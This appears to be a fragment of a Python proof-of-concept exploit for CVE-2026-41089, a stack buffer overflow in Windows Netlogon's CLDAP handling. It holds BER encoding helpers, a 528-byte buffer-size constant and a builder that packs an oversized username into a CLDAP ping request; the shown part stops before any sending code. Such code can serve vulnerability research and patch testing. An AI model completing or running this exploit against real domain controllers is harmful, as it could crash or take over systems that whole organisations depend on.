CVE-2026-41089 - Netlogon CLDAP Stack Buffer Overflow

    Sends a crafted CLDAP ping request with oversized username field

NETLOGON_BUFFER_BYTES = 528

# --------------------- BER Encoding Functions ---------------------
def ber_length(length):
    if length < 0x80:
        return bytes([length])
    if length < 0x100:
        return bytes([0x81, length])
    if length < 0x10000:
        return bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])
    return bytes([0x83, (length >> 16) & 0xFF, (length >> 8) & 0xFF, length & 0xFF])

def ber_int(value):
    if value == 0:
        return b"\x02\x01\x00"
    data = value.to_bytes((value.bit_length() + 7) // 8, "big")
    return b"\x02" + ber_length(len(data)) + data

def ber_string(tag, value):
    if isinstance(value, str):
        value = value.encode("utf-8")
    return bytes([tag]) + ber_length(len(value)) + value

def ber_sequence(tag, content):
    return bytes([tag]) + ber_length(len(content)) + content

def username_size_info(username):
    wire_bytes = len(username.encode("utf-8"))
    unicode_bytes = len(username.encode("utf-16-le"))
    return wire_bytes, unicode_bytes

# --------------------- CLDAP Ping Builder ---------------------
def build_cldap_ping(domain, username, ntver=DEFAULT_NTVER):
    ntver_bytes = struct.pack("<I", ntver)

    filter_content = (
        ber_sequence(0xA3, ber_string(0x04, "DnsDomain") + ber_string(0x04, domain))
        + ber_sequence(0xA3, ber_string(0x04, "User") + ber_string(0x04, username))
        + ber_sequence(0xA3, ber_string(0x04, "NtVer") + ber_string(0x04, ntver_bytes))
    )

    search_body = (
        ber_string(0x04, "")  # baseObject
        + ber_int(0)  # scope
        + ber_int(0)  # derefAliases
        + ber_int(0)  # sizeLimit
        + ber_int(0)  # timeLimit
        + bytes([0x01, 0x01, 0x00])  # typesOnly = FALSE
        + ber_sequence(0xA0, filter_content)  # AND filter
        + ber_sequence(0x30, ber_string(0x04, "Netlogon"))  # attributes
    )

    search_request = ber_sequence(0x63, search_body)  # SearchRequest
    return ber_sequence(0x30, ber_int(1) + search_request)
